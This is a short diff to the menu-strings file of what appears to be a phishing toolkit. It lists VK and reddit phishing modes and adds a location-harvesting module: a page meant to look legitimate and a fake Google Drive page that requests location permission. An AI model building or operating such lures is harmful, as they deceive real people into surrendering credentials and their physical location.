@@ -50,6 +50,11 @@ lang_start_main_menu = {
     [ [_('{0}[{1}1{0}]{1} Standard VK Web Page Phishing'), _('{0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)')]],
     "reddit_operation_modes" :
     [ [_('{0}[{1}1{0}]{1} New reddit page'), _('{0}[{1}2{0}]{1} Old reddit page')]],
+    "additional_module_location_operation_modes" :
+    [ [_('{0}[{1}1{0}]{1} NEAR YOU (Webpage Looks Like Legitimate)'), _('{0}[{1}2{0}]{1} GDRIVE (Asks For Location Permission To redirect GDRIVE)')]]
+
+
+
 }
 
              
